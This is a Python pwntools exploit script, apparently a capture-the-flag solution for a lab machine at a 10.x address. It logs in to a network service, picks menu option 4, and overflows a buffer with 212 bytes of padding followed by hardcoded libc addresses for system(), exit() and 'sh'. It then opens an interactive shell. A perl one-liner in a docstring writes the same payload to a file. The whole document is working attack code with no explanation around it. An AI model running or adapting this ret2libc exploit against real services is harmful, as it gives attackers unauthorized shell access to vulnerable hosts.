import sys
import optparse
from pwn import *

'''
perl -e 'print "picarda1"; print "\n"; print "4"; print "\n"; print  "A" x 208; print "B" x 4; print "\x60\xc0\xe4\xf7"; print "\xf0\xfa\xe3\xf7"; print "\x5e\xf6\xe1\xf7"' > /tmp/bof

'''
context(arch = 'i386', os = 'linux')

def exploit(remote):
    # picarda1
    line = remote.recv(1024)
    print("\n"+line)
    remote.sendline('picarda1')

    # 4
    line = remote.recv(1024)
    print("\n"+line)
    remote.sendline('4')

    ########### Ret2libc Exploit ###########
    ## padding + system() + exit() + "sh" ##

    system  = struct.pack("<I", 0xf7e4c060)
    exit    = struct.pack("<I", 0xf7e3faf0)
    sh      = struct.pack("<I", 0xf7e1f65e)
    
    print("System address: " + system)
    print("Exit Addr: " + exit)
    print("sh Addr: " + sh)

    padding = 212 * "A"
    payload = padding + system + exit + sh
    remote.sendline(payload)
    print("Exploit finished!\n")

parser = optparse.OptionParser()
parser.add_option('-t', '--target', dest="target", help="specify the target to connect to", default="10.10.10.61")
parser.add_option('-p', '--port', dest="port", help="specify the port to connect to", default=32812)

options, args = parser.parse_args()

target = options.target
port = int(options.port)

r = remote(target, port)

# "Fix" issue with Terminator
context.terminal = ["terminator", "-e"]

print("\nTargeting: " + target + " (" + str(port) + ")")

exploit(r)
r.interactive()
r.close()
